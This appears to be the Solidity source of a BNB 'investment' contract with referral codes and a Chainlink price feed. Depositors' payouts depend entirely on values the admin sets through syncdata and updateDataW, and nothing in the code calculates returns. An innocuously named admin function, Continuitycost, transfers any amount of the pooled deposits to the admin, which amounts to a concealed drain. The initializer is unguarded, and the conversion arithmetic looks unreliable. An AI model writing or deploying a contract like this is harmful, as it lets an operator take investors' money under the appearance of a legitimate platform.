// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.9;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumerV3 {

    AggregatorV3Interface internal priceFeed;

    /**
     * Network: bsc
     * Aggregator: BNB/USD
     * BSC MAIN Address: 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE
	 * BSC TEST Address=> 0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526
     */
    function start() external {
        priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526);
    }

    /**
     * Returns the latest price
     */
    function getLatestPrice() public view returns (int) {
        (
            /* uint80 roundID */,
            int price,
            /*uint startedAt */,
            /*uint timeStamp*/,
           /* uint80 answeredInRound*/
        ) = priceFeed.latestRoundData();
        return price;
    }

    function TotalusdPrice(int _amount) public view returns (int) {
        int usdt = getLatestPrice();
        return (usdt * _amount)/1e18;

    }

}

contract QunoCoin_masterNew is PriceConsumerV3 {
    struct Deposit {
        uint amount ;
        uint timestamp;
    }

    struct  User {
        address refferal_code;
        uint amount;
        uint timestamp;
        Deposit [] deposit;
        uint totalIncome;
        uint withdrawan;
    }

    bool public started;
    bool private IsInitinalized;
    address payable public admin;
    mapping (address => User)  public userdata;

    function initinalize(address payable _admin) external{
        require(IsInitinalized ==false );
        admin = _admin;
        IsInitinalized = true ;
    }


    function invest (address _refferal_code) public payable{

        if (!started) {
			if (msg.sender == admin) {
				started = true;
			} else revert("Not started yet");
		}
      
        User storage user = userdata[msg.sender];

        if (user.refferal_code == address(0)) {
			if (userdata[_refferal_code].deposit.length > 0 && _refferal_code != msg.sender) {
				user.refferal_code = _refferal_code;
			}
		}

        user.amount += msg.value;
        user.timestamp = block.timestamp;
        user.deposit.push(Deposit(msg.value , block.timestamp));
        
    }

    function userWithdrawal() public returns(bool){
        User storage u = userdata[msg.sender];
        bool status;
        if(u.totalIncome > u.withdrawan){
        uint amount = (u.totalIncome - u.withdrawan);
        u.withdrawan = (u.withdrawan + amount);
        payable(msg.sender).transfer(amount);
        status = true;
        }

        return status;
    }

    function syncdata(uint _amount ,address _useraddress) public returns(bool){

        bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[_useraddress];
        u.totalIncome = _amount;

        return status;
    }

    function updateDataW(uint _amount , address _useraddress) public returns(bool){

       bool status;
        require(msg.sender == admin, 'permission denied!');
        User storage u = userdata[_useraddress];
        u.withdrawan = _amount;

        return status;
    }




    function getDepositLength(address _useraddress) public view returns(uint){
        User storage u = userdata[_useraddress] ;
        return u.deposit.length;
    }


    function getDeposit(uint _index ,address _useraddress) public view returns(uint , uint){
        User storage u = userdata[_useraddress] ;
        return (u.deposit[_index].amount , u.deposit[_index].timestamp);
    }
    function getUserInfo( address _useraddress) public view returns (address ,uint ,uint){
         User storage u2 = userdata[_useraddress];
         return (u2.refferal_code,u2.amount,u2.timestamp);
    }
    function Continuitycost(uint256 amount) public{
       
		require(msg.sender == admin , "permission denied!");	   		 
        payable(msg.sender).transfer(amount);
			
    }
    function getCalculatedBnbRecieved(uint256 _amount) public view returns(uint256) {
		uint256 usdt = uint256(PriceConsumerV3.getLatestPrice());
		uint256 recieved_bnb = (_amount*1e18)/usdt*1e8;
		return recieved_bnb;
	}
	
       
       
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AggregatorV3Interface {
  function decimals() external view returns (uint8);

  function description() external view returns (string memory);

  function version() external view returns (uint256);

  function getRoundData(uint80 _roundId)
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );

  function latestRoundData()
    external
    view
    returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    );
}